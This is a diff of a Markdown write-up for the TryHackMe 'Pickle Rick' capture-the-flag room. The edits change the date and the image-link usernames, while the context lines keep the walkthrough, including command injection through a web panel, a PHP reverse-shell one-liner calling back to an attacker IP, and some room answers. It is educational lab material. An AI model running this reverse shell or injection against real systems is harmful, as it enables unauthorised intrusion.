@@ -4,7 +4,7 @@ Room link: https://tryhackme.com/room/picklerick
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 6/29/2023
+This writeup was last updated: 07/04/2023
 
 # Scanning and Enumeration
 > Port Scanning Using Nmap 
@@ -73,7 +73,7 @@ DOWNLOADED: 28 - FOUND: 3
 └─$ vim Extensions.txt
 ```
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/extensions.txt.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/extensions.txt.png)
 
 6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created and then redirect the results into a text file
 7. `cat {FILENAME3}.txt` to output the scan results from the previous command
@@ -167,24 +167,24 @@ Wubbalubbadubdub
 > Logging In
 10. `firefox "http://{TARGET IP}/login.php"` to open Firefox and redirect it to the target's web server's **login.php** page and log in using Rick's username that we found and the string we found in the **robots.txt** file as his password, which successfully logged us in and brought us to a command panel
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/login.php.png)
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/login.php.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
 
 
 # Vulnerability Identification
 > Command Injection
 11. `ls` to list the available files and directories that are in the current directory that we're in
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
 
 12. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which ended up displayed an error saying the the command is disabled
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Disabled.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Disabled.png)
 
 14. `sudo -l` to list the sudo privileges assigned to the user so that we can attempt to spawn a reverse shell, which turned out that the current user we're logged in as can ran any command as root
 15. `php --version` to confirm that this server does in fact run PHP, which it does
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/php%20--version.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/php%20--version.png)
 
 17. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell
 
@@ -198,7 +198,7 @@ listening on [any] 9999 ...
 ```
 17. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Reverse%20Shell%20Payload.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Reverse%20Shell%20Payload.png)
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -289,7 +289,7 @@ fleeb juice
 
 **Room complete!**
 
-![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Pickle%20Rick.png)
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Pickle%20Rick.png)
 
 # Command History
 1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
